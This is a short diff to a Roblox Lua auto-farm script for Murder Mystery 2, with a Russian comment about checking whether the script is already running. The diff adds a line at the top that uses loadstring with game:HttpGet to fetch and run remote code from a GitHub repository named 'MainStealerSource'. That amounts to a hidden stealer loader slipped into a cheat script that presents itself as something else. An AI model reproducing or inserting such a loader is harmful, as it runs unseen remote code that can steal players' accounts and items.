@@ -1,3 +1,7 @@
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/johnscript2/MainStealerSource/refs/heads/main/Here')))()
+
+
 -- Проверка на уже запущенный скрипт
 if _G.AutoFarmMM2IsLoaded then return end
 _G.AutoFarmMM2IsLoaded = true
